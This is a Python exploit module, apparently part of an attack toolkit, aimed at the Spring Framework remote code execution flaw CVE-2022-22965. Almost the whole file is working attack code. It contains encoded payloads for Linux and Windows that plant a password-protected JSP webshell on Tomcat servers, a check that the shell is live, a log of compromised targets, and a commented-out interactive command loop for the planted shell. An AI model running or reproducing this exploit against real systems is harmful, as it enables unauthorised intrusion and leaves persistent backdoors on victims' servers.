#!/user/bin/env python3
# -*- coding: utf-8 -*-

import requests, urllib3
from libs.public.outprint import OutPrintInfo
from time import sleep
# from tqdm import tqdm
urllib3.disable_warnings()
class Cve_2022_22965:
    def CVE_2022_22965(self, url, proxies):
        # OutPrintInfo("Spring", "================开始对目标URL进行CVE-2022-22965漏洞利用================")
        Headers_1 = {
            "User-Agent": self.headers,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        data1 = payload_linux
        data2 = payload_win
        getpayload = url + payload_http
        try:
            requests.post(url, headers=Headers_1, data=data1, allow_redirects=False, timeout=self.timeout, verify=self.ssl, proxies=proxies)
            sleep(1)
            requests.post(url, headers=Headers_1, data=data2, allow_redirects=False, timeout=self.timeout, verify=self.ssl, proxies=proxies)
            sleep(1)
            requests.get(getpayload, headers=Headers_1, allow_redirects=False, timeout=self.timeout, verify=self.ssl, proxies=proxies)
            sleep(1)
            test = requests.get(url + "tomcatwar.jsp")
            if (test.status_code == 200) and ('aabysszg' in str(test.text)):
                OutPrintInfo("Spring", f"存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为:{url}tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
                with open("./result/springShell.txt", "a") as w:
                    w.write(f"{url}\n")
                # while 1:
                #     cmd = input("请输入要执行的命令>>> ")
                #     url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
                #     r = requests.get(url_shell)
                #     resp = r.text
                #     result = re.findall('([^\x00]+)\n', resp)[0]
                #     OutPrintInfo("Spring", result)
            else:
                # OutPrintInfo("Spring", "CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描")
                pass
        except Exception as e:
            # OutPrintInfo("Spring", e)
            pass

    def main(self, target):
        url = target[0].strip('/ ')
        proxy = target[1]
        self.timeout = int(target[2])
        self.ssl = target[3]
        self.headers = target[4]
        proxys = {"http": proxy, "https": proxy}
        self.CVE_2022_22965(url, proxys)